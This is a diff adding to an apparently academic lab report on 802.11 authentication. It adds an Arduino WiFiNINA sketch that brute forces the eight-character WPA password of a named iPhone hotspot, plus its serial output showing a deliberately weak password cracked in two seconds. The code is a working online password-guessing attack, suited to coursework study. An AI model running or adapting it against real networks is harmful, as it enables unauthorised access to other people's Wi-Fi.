@@ -73,6 +73,32 @@ After succesful connection, following information of the network is printed:
 - IP address
 - MAC address
 
+## Result of brute forcing password to a specific network with password of 8 characters:
+
+``` shell
+Attempting to brute force password of 8 characters to WPA SSID: iPhone (Ilmari)
+Tried password: aaaaaaaa
+Tried password: aaaaaaab
+Tried password: aaaaaaac
+Tried password: aaaaaaad
+Tried password: aaaaaaae
+Tried password: aaaaaaaf
+Tried password: aaaaaaag
+Tried password: aaaaaaah
+Time elapsed: 2 seconds
+Succesfully hacked to the networkSSID: iPhone (Ilmari)
+BSSID: E2:B2:85:0B:5E:95
+signal strength (RSSI):-39
+Encryption Type:4
+
+IP Address: 172.20.10.9
+172.20.10.9
+MAC address: 4C:EB:D6:4C:9C:E0
+```
+
+Because Iphone hotspot password needs to be atleast 8 characters, for simplicity the password is made to be very easy and fast to crack.
+The result is succesful connection by brute forcing the passwords in 2 seconds.
+
 ## 4. Answer to the given questions
 
 ### 4.1 Which authentication methods did you find for 802.11?
@@ -383,3 +409,312 @@ void printWifiData() {
 ```
 
 ### Arduino script for attempting to connect to a specific network by brute forcing the password
+
+```C
+/*
+ This script prints tries to connect to a specific network by brute forcing the 8 letter password.
+ */
+
+#include <SPI.h>
+#include <WiFiNINA.h>
+
+char ssid[] = "iPhone (Ilmari)";      // SSID
+int status = WL_IDLE_STATUS; 
+unsigned long startTime;              // for calculating brute force time taken
+bool found = false;                   // is the password found
+
+void setup() {
+
+  //Initialize serial and wait for port to open:
+
+  Serial.begin(9600);
+  startTime = millis(); // Record the start time
+
+  while (!Serial) {
+
+    ; // wait for serial port to connect.
+
+  }
+
+  // check for the WiFi module:
+
+  if (WiFi.status() == WL_NO_MODULE) {
+
+    Serial.println("Communication with WiFi module failed!");
+
+    // don't continue
+
+    while (true);
+
+  }
+
+  // print MAC address:
+
+  byte mac[6];
+
+  WiFi.macAddress(mac);
+
+  Serial.print("MAC: ");
+
+  printMacAddress(mac);
+}
+
+
+void loop() {
+
+    char letters[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'};
+    
+    //, 'i', 'j', 'k', 'l', 'm', 
+    //              'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
+
+    int charListLength = 8;
+
+
+    // connect to the network
+    //while (status != WL_CONNECTED) {
+    unsigned long currentTime = millis();
+    unsigned long elapsedTime;
+    Serial.print("Attempting to brute force password of 8 characters to WPA SSID: ");
+
+    Serial.println(ssid);
+
+    // Connect to WPA/WPA2 network:
+    if (found == false) {
+      for (int i1 = 0; i1 < charListLength; i1++) {
+        for (int i2 = 0; i2 < charListLength; i2++) {
+            for (int i3 = 0; i3 < charListLength; i3++) {
+                for (int i4 = 0; i4 < charListLength; i4++) {
+                    for (int i5 = 0; i5 < charListLength; i5++) {
+                        for (int i6 = 0; i6 < charListLength; i6++) {
+                            for (int i7 = 0; i7 < charListLength; i7++) {
+                                for (int i8 = 0; i8 < charListLength; i8++) {
+                                    // Construct the current combination
+                                    char pass[9] = {letters[i1], letters[i2], letters[i3],
+                                                          letters[i4], letters[i5], letters[i6],
+                                                          letters[i7], letters[i8], '\0'};
+
+                                    Serial.print("Tried password: ");
+                                    Serial.print(pass);
+                                    Serial.print("\n");
+                                    // Check if it matches the password
+                                    status = WiFi.begin(ssid, pass);
+                                    if (status == WL_CONNECTED) {
+                                        found = true;
+                                        elapsedTime = currentTime - startTime;
+                                        break;
+                                    }
+                                }
+                                if (found) break;
+                            }
+                            if (found) break;
+                        }
+                        if (found) break;
+                    }
+                    if (found) break;
+                }
+                if (found) break;
+            }
+            if (found) break;
+        }
+        if (found) break;
+      }
+      Serial.print("Time elapsed: ");
+      unsigned long elapsedTimeinSeconds = elapsedTime /1000;
+      Serial.print(elapsedTimeinSeconds);
+      Serial.print(" seconds");
+      Serial.print("\n");
+
+      Serial.print("Succesfully hacked to the network");
+
+      printCurrentNet();
+
+      printWifiData();
+      exit(0);
+    }
+
+
+    if (found == false) {
+      Serial.print("Unable to brute force the password");
+      exit(0);
+    }
+    
+
+}
+void listNetworks() {
+
+  // scan for nearby networks:
+
+  Serial.println("** Scan Networks **");
+
+  int numSsid = WiFi.scanNetworks();
+
+  if (numSsid == -1) {
+
+    Serial.println("Couldn't get a wifi connection");
+
+    while (true);
+
+  }
+
+  // print the list of networks seen:
+
+  Serial.print("number of available networks:");
+
+  Serial.println(numSsid);
+
+  // print the network number and name for each network found:
+
+  for (int thisNet = 0; thisNet < numSsid; thisNet++) {
+
+    Serial.print(thisNet);
+
+    Serial.print(") ");
+
+    Serial.print(WiFi.SSID(thisNet));
+
+    Serial.print("\tSignal: ");
+
+    Serial.print(WiFi.RSSI(thisNet));
+
+    Serial.print(" dBm");
+
+    Serial.print("\tEncryption: ");
+
+    printEncryptionType(WiFi.encryptionType(thisNet));
+
+  }
+}
+
+void printEncryptionType(int thisType) {
+
+  // read the encryption type and print out the name:
+
+  switch (thisType) {
+
+    case ENC_TYPE_WEP:
+
+      Serial.println("WEP");
+
+      break;
+
+    case ENC_TYPE_TKIP:
+
+      Serial.println("WPA");
+
+      break;
+
+    case ENC_TYPE_CCMP:
+
+      Serial.println("WPA2");
+
+      break;
+
+    case ENC_TYPE_NONE:
+
+      Serial.println("None");
+
+      break;
+
+    case ENC_TYPE_AUTO:
+
+      Serial.println("Auto");
+
+      break;
+
+    case ENC_TYPE_UNKNOWN:
+
+    default:
+
+      Serial.println("Unknown");
+
+      break;
+
+  }
+}
+
+void printMacAddress(byte mac[]) {
+
+  for (int i = 5; i >= 0; i--) {
+
+    if (mac[i] < 16) {
+
+      Serial.print("0");
+
+    }
+
+    Serial.print(mac[i], HEX);
+
+    if (i > 0) {
+
+      Serial.print(":");
+
+    }
+
+  }
+
+  Serial.println();
+}
+
+void printCurrentNet() {
+
+  // print the SSID of the network you're attached to:
+
+  Serial.print("SSID: ");
+
+  Serial.println(WiFi.SSID());
+
+  // print the MAC address of the router you're attached to:
+
+  byte bssid[6];
+
+  WiFi.BSSID(bssid);
+
+  Serial.print("BSSID: ");
+
+  printMacAddress(bssid);
+
+  // print the received signal strength:
+
+  long rssi = WiFi.RSSI();
+
+  Serial.print("signal strength (RSSI):");
+
+  Serial.println(rssi);
+
+  // print the encryption type:
+
+  byte encryption = WiFi.encryptionType();
+
+  Serial.print("Encryption Type:");
+
+  Serial.println(encryption, HEX);
+
+  Serial.println();
+}
+
+void printWifiData() {
+
+  // print your board's IP address:
+
+  IPAddress ip = WiFi.localIP();
+
+  Serial.print("IP Address: ");
+
+  Serial.println(ip);
+
+  Serial.println(ip);
+
+  // print your MAC address:
+
+  byte mac[6];
+
+  WiFi.macAddress(mac);
+
+  Serial.print("MAC address: ");
+
+  printMacAddress(mac);
+}
+
+
+
+```
